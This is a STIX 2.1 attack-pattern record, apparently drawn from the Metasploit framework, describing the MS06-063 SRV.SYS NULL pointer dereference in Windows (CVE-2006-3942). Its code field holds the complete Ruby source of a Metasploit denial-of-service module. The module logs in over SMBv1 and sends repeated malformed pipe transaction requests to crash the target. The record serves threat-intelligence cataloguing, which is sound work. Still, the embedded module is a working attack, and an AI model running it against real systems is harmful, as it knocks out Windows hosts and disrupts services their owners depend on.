{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--3eba736f-0fb1-4c80-8b5a-440aae50ac93",
    "created": "2024-08-14T16:25:37.286105Z",
    "modified": "2024-08-14T16:25:37.28611Z",
    "name": "Microsoft SRV.SYS Pipe Transaction No Null",
    "description": " This module exploits a NULL pointer dereference flaw in the SRV.SYS driver of the Windows operating system. This bug was independently discovered by CORE Security and ISS.  ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/dos/windows/smb/ms06_063_trans.rb",
            "external_id": "ms06_063_trans.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2006-3942"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::SMB::Client\n  include Msf::Auxiliary::Dos\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Microsoft SRV.SYS Pipe Transaction No Null',\n      'Description'    => %q{\n        This module exploits a NULL pointer dereference flaw in the\n      SRV.SYS driver of the Windows operating system. This bug was\n      independently discovered by CORE Security and ISS.\n      },\n\n      'Author'         => [ 'hdm' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['OSVDB', '27644' ],\n          ['MSB', 'MS06-063' ],\n          ['CVE', '2006-3942'],\n          ['BID', '19215'],\n        ]\n    ))\n\n    deregister_options('SMB::ProtocolVersion')\n  end\n\n  def run\n\n    print_status(\"Connecting to the target system...\");\n\n    connect(versions: [1])\n    smb_login\n\n    begin\n      1.upto(5) do |i|\n        print_status(\"Sending bad SMB transaction request #{i}...\");\n        self.simple.client.trans_nonull(\n          \"\\\\#{Rex::Text.rand_text_alphanumeric(rand(16)+1)}\",\n          '',\n          Rex::Text.rand_text_alphanumeric(rand(16)+1),\n          3,\n          [1,0,1].pack('vvv'),\n          true\n        )\n      end\n    rescue ::Interrupt\n      return\n\n    rescue ::Exception => e\n      print_error(\"Error: #{e.class} > #{e}\")\n    end\n\n\n    disconnect\n  end\nend\n"
}